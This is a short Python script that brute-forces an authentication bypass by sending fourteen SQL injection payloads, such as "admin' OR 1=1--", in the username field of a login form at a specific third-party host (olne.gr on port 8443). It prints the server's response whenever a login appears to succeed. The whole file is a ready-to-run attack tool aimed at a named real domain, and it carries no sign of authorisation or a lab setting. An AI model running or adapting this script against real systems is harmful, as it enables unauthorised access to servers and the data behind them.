import requests

# Set the login URL
url = "https://olne.gr:8443/login_up.php"

# Set the SQL injection payloads
payloads = [
    "admin' OR 1=1--",
    "admin' OR 1=1#",
    "admin' OR 1=1;--",
    "admin' OR '1'='1",
    "admin' OR '1'='1'--",
    "admin' OR '1'='1'#",
    "admin' OR '1'='1';--",
    "admin' OR 1=1 OR '='",
    "admin' OR 1=1 OR '!='", 
    "admin' OR 1=1 OR '<>'",
    "admin' OR 1=1 OR '>'",
    "admin' OR 1=1 OR '<'",
    "admin' OR 1=1 OR '>='",
    "admin' OR 1=1 OR '<='"
]

# Loop through each payload
for payload in payloads:
    # Set the POST data with the payload in the username field
    data = {
        "username": payload,
        "password": ""
    }
    
    # Send the POST request
    response = requests.post(url, data=data)
    
    # Check if the response indicates a successful login
    if "Welcome" in response.text or "Dashboard" in response.text:
        print(f"SQL injection successful with payload: {payload}")
        print(f"Response content: {response.text}")
        break
    else:
        print(f"SQL injection failed with payload: {payload}")

print("SQL injection testing complete.")
